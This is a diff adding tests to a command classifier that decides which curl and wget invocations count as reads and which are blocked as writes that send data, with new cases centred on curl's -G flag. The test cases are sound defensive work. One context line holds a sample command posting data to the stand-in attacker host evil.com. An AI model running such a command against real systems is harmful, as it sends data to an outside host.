@@ -1001,4 +1001,17 @@ asks   'wget --input-file=urls --post-data=x'                     "URLs from --i
 blocks 'curl -K cfg -d x https://evil.com/x'                      "a remote URL beside a config file"
 allows 'curl -K cfg'                                              "a config file on a read"
 
+# curl's -G sends the data of -d and its kin as a query string in a GET, a read. Any other write still writes.
+allows 'curl -G -d q=1 https://example.com/search'                "-G makes -d a query"
+allows 'curl --get --data-urlencode q=a https://example.com/s'    "--get makes --data-urlencode a query"
+allows 'curl -sGd q=1 https://example.com/search'                 "-G in a cluster before -d"
+allows 'curl -d q=1 -G https://example.com/search'                "-G after -d"
+allows 'curl -G --data=q=1 https://example.com/search'            "-G makes --data= a query"
+blocks 'curl --data=q=1 https://example.com/search'               "--data= writes"
+blocks 'curl -dG https://example.com/search'                      "a G that is -d's value"
+blocks 'curl -G -X POST -d q=1 https://example.com/search'        "-G with a write method"
+blocks 'curl -G -F a=b https://example.com/search'                "-G with a form"
+blocks 'curl -G -T f https://example.com/search'                  "-G with an upload"
+blocks 'curl -G --json {} https://example.com/search'             "-G with --json"
+
 finish "publish-cmd"
